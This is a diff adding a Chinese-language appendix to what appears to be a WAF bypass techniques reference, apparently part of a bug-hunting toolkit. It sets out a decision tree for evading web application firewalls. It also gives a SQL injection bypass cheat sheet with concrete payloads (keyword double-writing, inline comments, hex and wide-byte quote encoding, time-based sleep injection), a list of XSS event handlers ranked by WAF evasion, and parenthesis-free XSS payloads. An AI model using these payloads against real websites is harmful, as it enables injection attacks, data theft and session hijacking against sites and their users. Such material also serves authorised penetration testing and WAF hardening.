@@ -87,3 +87,67 @@ description: WAF 绕过技巧库 — 各类WAF绕过方法
 - HTML 实体编码
 - Unicode 编码
 - Base64 编码（配合 eval）
+
+---
+
+## 附：绕过决策方法论（src-hunter 通用绕过工具箱精华）
+
+### 绕过的本质
+
+```
+绕过 = 解析差异 + 边界 corner case + 防护盲区
+```
+
+每次被拦时问自己三问：
+- **Q1** 防护组件和后端的解析是否一致？（前置 WAF vs Tomcat、CDN vs 源站）
+- **Q2** 防护是否覆盖所有 corner case？（双编码、混合大小写、长度溢出）
+- **Q3** 防护是否覆盖所有入口？（Header、Cookie、HPP、其他 HTTP 动词）
+
+### 决策树
+
+```
+Payload 被拦
+ ├─ 看返回是 WAF？应用？还是源站？
+ │   ├─ WAF 拦 → 协议层绕过（HPP / Chunked / 大小写 / Content-Type 切换）
+ │   └─ 应用拦 → 编码层 / 语义层（双写、注释、等价函数）
+ ├─ 看是黑名单还是白名单
+ │   ├─ 黑名单 → 找漏掉的关键字 / 同义词
+ │   └─ 白名单 → 找白名单允许的危险用法
+ └─ 看是输入过滤还是输出编码
+     ├─ 输入过滤 → 多重编码 / 二次注入
+     └─ 输出编码 → 上下文逃逸（HTML→JS、URL→JS）
+```
+
+### SQLi 绕过速查（分维度）
+
+| 维度 | 技巧 | Payload 示例 |
+|------|------|-------------|
+| 关键字过滤 | 双写 | `UNunionION SELselectECT`（一次替换型过滤器） |
+| 关键字过滤 | MySQL 内联注释 | `/*!50000union*//*!50000select*/` |
+| 关键字过滤 | 同义词 | `\|\|` 代 `OR`，`&&` 代 `AND` |
+| 等号过滤 | 等价替换 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` 代 `=` |
+| 空格过滤 | 空白符变体 | `/**/` `%09` `%0a` `%0d`；括号嵌套 `select(user)from(dual)` |
+| 引号过滤 | 编码 | `0x61646D696E`（hex）、`char(97,100,109,105,110)`、`%df%27`（GBK 宽字节） |
+| sleep 被过滤 | 双层延时 | `id=(select(2)from(select(sleep(8)))v)` |
+| sleep 被过滤 | 条件延时 | `id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(10) ELSE 1 END))` |
+
+### XSS 事件库（按罕见度，越往下越能打 WAF）
+
+```
+onerror onload onclick onmouseover                  # 已被多数 WAF 收录
+onfocus onblur oninput onchange autofocus           # 中等
+onanimationend ontransitionend ontoggle ontouchstart
+onpointerenter oncanplay onauxclick onbeforeprint   # 罕见
+```
+
+### XSS 无括号/关键字绕过
+
+```
+alert`1`                       # 模板字符串绕括号
+throw onerror=alert,1
+eval('al'+'ert(1)')             # 拼接
+Function('alert(1)')()         # 构造器
+window['al'+'ert'](1)
+String.fromCharCode(97,108,101,114,116,40,49,41)
+location='javascript:alert(1)'
+```
